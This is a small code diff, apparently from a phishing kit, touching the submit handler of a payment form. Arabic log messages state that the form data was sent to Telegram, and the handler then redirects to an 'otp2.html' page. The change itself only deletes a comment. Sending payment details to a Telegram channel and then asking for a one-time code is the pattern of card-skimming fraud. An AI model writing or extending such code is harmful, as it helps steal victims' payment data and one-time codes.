@@ -284,8 +284,7 @@ document.getElementById('paymentForm').addEventListener('submit', function(event
         .then(data => {
             console.log('تم إرسال البيانات إلى تلجرام:', data);
 
-            // ✅ الانتقال إلى الصفحة المطلوبة بعد إرسال البيانات بنجاح
-            window.location.href = "otp2.html"; // ← تأكد من اسم الصفحة
+            window.location.href = "otp2.html";    
         })
         .catch(error => {
             console.error('حدث خطأ أثناء إرسال البيانات إلى تلجرام:', error);
